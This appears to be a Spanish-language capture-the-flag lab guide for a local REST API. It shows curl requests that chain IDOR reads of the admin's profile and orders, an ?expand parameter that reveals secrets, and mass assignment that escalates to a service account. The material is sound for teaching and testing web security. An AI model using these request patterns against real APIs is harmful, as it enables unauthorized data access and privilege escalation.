## IDOR encadenado

El lab simula una API REST donde eres alice (id=2). Encadena tres ataques:

### 1. IDOR básico: leer datos de otro usuario
```bash
curl http://127.0.0.1:18096/api/user/1
# Ves el perfil del admin (incluye api_key pero NO secret)

curl "http://127.0.0.1:18096/api/user/1?expand"
# Con ?expand ves TODOS los campos, incluido secret = FLAG
```

### 2. IDOR en pedidos
```bash
curl http://127.0.0.1:18096/api/order/1002
# Pedido del admin con internal_note = FLAG
```

### 3. Mass assignment
```bash
curl "http://127.0.0.1:18096/api/me?user_id=4&role=admin"
# El endpoint acepta user_id y role como parámetros → te conviertes en svc_backup
```

La cadena completa: enumerar usuarios → IDOR a admin → expand para secret → mass assignment a service account.
